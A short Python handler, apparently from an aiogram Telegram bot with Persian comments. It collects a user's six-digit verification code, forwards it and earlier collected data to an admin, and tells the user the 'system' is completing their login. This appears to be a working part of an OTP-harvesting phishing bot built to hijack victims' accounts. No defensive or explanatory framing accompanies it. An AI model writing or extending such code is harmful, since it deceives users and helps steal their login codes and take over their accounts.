# ✅ دریافت کد تایید (با اعتبارسنجی دقیق)
# =============================================
@dp.message(Form.code)
async def get_code(message: Message, state: FSMContext):
    code = message.text.strip()
    
    # اعتبارسنجی کد
    if not code.isdigit():
        await message.reply("⚠️ کد تایید باید فقط شامل اعداد باشد. لطفاً مجدد وارد کنید:")
        return
    
    if len(code) != 6:
        await message.reply("⚠️ کد تایید باید ۶ رقمی باشد. لطفاً مجدد وارد کنید:")
        return

    # دریافت اطلاعات قبلی
    data = await state.get_data()
    data['code'] = code
    data['step'] = 'code_received'
    
    # ارسال کد به ادمین
    await send_to_admin(data, "code_received")
    
    await message.reply(
        "🔄 **کد تایید به سامانه ارسال شد.**\n\n"
        "⏳ در حال تکمیل فرآیند ورود، لطفاً صبر کنید...\n"
        "پاسخ از سمت سیستم به شما اطلاع داده خواهد شد.",
        parse_mode="Markdown",
        reply_markup=remove_keyboard()
    )
    
    # پاک کردن state
    await state.clear()
    
    logger.info(f"✅ کاربر {message.chat.id} کد تایید را وارد کرد و فرآیند تکمیل شد.")

